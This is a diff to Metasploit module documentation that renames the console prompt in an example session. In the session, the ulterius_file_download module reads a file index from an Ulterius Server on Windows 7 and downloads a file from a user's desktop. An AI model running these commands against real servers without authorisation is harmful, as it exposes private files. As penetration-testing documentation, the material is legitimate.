@@ -45,20 +45,20 @@ Note: If you are using relative paths, use three periods when traversing down a 
 ### Ulterius Server v1.8.0.0 on Windows 7 SP1 x64.
 
 ```
-msf5 > use auxiliary/admin/http/ulterius_file_download
-msf5 auxiliary(admin/http/ulterius_file_download) > set rhost 172.22.222.122
+msf > use auxiliary/admin/http/ulterius_file_download
+msf auxiliary(admin/http/ulterius_file_download) > set rhost 172.22.222.122
 rhost => 172.22.222.122
-msf5 auxiliary(admin/http/ulterius_file_download) > run
+msf auxiliary(admin/http/ulterius_file_download) > run
 
 [*] Starting to parse fileIndex.db...
 [*] Remote file paths saved in: filepath0
 [*] Auxiliary module execution completed
-msf5 auxiliary(admin/http/ulterius_file_download) > set path 'C:/users/pwnduser/desktop/tmp.txt'
+msf auxiliary(admin/http/ulterius_file_download) > set path 'C:/users/pwnduser/desktop/tmp.txt'
 path => C:/users/pwnduser/desktop/tmp.txt
-msf5 auxiliary(admin/http/ulterius_file_download) > run
+msf auxiliary(admin/http/ulterius_file_download) > run
 
 [*] C:/users/pwnduser/desktop/tmp.txt
 [*] File contents saved: filepath1
 [*] Auxiliary module execution completed
-msf5 auxiliary(admin/http/ulterius_file_download) >
+msf auxiliary(admin/http/ulterius_file_download) >
 ```
